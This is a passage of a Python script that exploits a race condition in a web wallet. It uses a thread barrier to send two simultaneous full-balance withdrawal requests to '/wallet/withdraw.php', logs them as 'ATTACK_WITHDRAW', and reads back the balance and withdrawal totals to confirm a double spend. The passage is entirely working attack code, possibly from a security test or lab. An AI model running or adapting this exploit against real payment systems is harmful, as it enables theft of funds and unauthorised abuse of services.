    barrier.wait()
    t0 = time.time()
    st, body = post_form(o, "/wallet/withdraw.php", {"amount": balance, "csrf": csrf})
    with lock:
        results.append((i, st, body, round(time.time() - t0, 3)))

threads = [threading.Thread(target=worker, args=(i,)) for i in range(2)]
for t in threads: t.start()
for t in threads: t.join()
for i, st, body, dt in sorted(results):
    print("ATTACK_WITHDRAW", i, st, body[:400], "elapsed", dt)

st, body = jget(op, "/wallet/index.php")
print("READBACK_AFTER_ATTACK", st, body[:800])
try:
    d = json.loads(body)
    print("SUMMARY balance", d["balance"], "count", len(d["withdrawals"]), "withdrawn_total", d["withdrawn_total"])
except Exception as e:
    print("SUMMARY_PARSE_ERROR", e)

